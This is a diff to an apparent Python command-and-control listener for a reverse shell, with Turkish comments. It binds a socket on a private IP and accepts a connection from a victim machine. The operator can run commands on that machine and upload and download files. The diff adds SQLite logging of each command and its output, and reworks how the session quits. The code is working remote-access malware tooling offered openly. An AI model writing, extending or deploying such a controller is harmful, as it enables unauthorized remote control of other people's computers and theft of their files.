@@ -1,16 +1,31 @@
 import socket
 import json
 import base64
+import sqlite3
+from datetime import datetime
+import requests
+
 class SocketListener:
     def __init__(self,ip,port):
         my_listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         my_listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
         my_listener.bind((ip,port))
         my_listener.listen(0)
+
+        self.conn = sqlite3.connect('database.db')
+        self.cursor = self.conn.cursor()
+        self.cursor.execute('''CREATE TABLE IF NOT EXISTS commands
+                  (id INTEGER PRIMARY KEY,
+                  date TEXT,
+                  input TEXT,
+                  output TEXT)''')
+        self.conn.commit()
+
+        print("SQL connected.")
+
         print("Listening.... :)")
         (self.my_connection, my_address) = my_listener.accept()
         print("Connection OK from " + str(my_address))
-
 
     def json_send(self, data):
         if isinstance(data[-1], bytes):  # Eğer son öğe bayt dizisi ise
@@ -30,14 +45,16 @@ class SocketListener:
             except ValueError:
                 continue
 
-    def command_execution(self,command_input):
+    def command_execution(self, command_input):
         self.json_send(command_input)
-        #çıkış işlemi
-        if command_input[0] == "quit":
-            self.my_connection.close()
-            exit() 
-        
-        return self.json_receive()
+        date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        input_data = " ".join(command_input)
+        output_data = self.json_receive()
+        self.cursor.execute('''INSERT INTO commands (date, input, output)
+                  VALUES (?, ?, ?)''', (date, input_data, output_data))
+        self.conn.commit()
+
+        return output_data
     
     def save_file(self,path,content):
         with open(path,"wb") as my_file:
@@ -53,6 +70,10 @@ class SocketListener:
             command_input = input("Enter command: ")
             # cd .. aradaki boşluğu anlamlandırmak için 
             command_input = command_input.split(" ")
+            if command_input[0] == "quit":
+                self.close_connection()
+                break
+
             if command_input[0] == "upload":
                 my_file_content = self.get_file_content(command_input[1])
                 command_input.append(my_file_content)
@@ -64,7 +85,12 @@ class SocketListener:
 
             print(command_output)
 
+    def close_connection(self):
+        self.conn.close()
+        self.my_connection.close()
+        print("Connections are closed.")
 
-my_socket_listener = SocketListener("192.168.1.115",8080)
-my_socket_listener.start_listener()
+    
 
+my_socket_listener = SocketListener("192.168.1.115", 8080)
+my_socket_listener.start_listener() 
